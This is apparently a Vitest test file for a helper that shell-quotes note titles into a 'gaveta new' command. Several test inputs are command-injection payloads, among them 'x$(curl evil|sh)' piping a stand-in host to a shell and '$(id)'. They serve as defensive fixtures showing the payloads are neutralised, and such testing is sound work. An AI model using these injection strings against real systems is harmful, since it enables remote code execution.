import { expect, it } from 'vitest';
import {
  ghostCreateCommand,
  posixShellSingleQuote,
  sanitizeGhostTitle,
} from './ghost-create-command.ts';

it('uses POSIX single quotes and ends options before the title', () => {
  expect(ghostCreateCommand('Nota fantasma')).toBe("gaveta new --type doc -- 'Nota fantasma'");
  expect(ghostCreateCommand('Dice "hola"')).toBe('gaveta new --type doc -- \'Dice "hola"\'');
});

it('neutralizes shell expansion metacharacters', () => {
  const command = ghostCreateCommand('x$(curl evil|sh)`id`$HOME');
  expect(command).toBe("gaveta new --type doc -- 'x$(curl evil|sh)`id`$HOME'");
  expect(command).not.toContain('"');
});

it('escapes embedded single quotes', () => {
  expect(posixShellSingleQuote("a'b")).toBe("'a'\\''b'");
  expect(ghostCreateCommand("O'Brien")).toBe("gaveta new --type doc -- 'O'\\''Brien'");
});

it('strips newlines and control characters from titles', () => {
  expect(sanitizeGhostTitle('a\nb\rc')).toBe('abc');
  expect(ghostCreateCommand('a\n-$(id)')).toBe("gaveta new --type doc -- 'a-$(id)'");
});

it('keeps a leading hyphen inside quoted title after --', () => {
  expect(ghostCreateCommand('-evil')).toBe("gaveta new --type doc -- '-evil'");
});

it('preserves backslashes literally inside single quotes', () => {
  expect(ghostCreateCommand('a\\b')).toBe("gaveta new --type doc -- 'a\\b'");
});
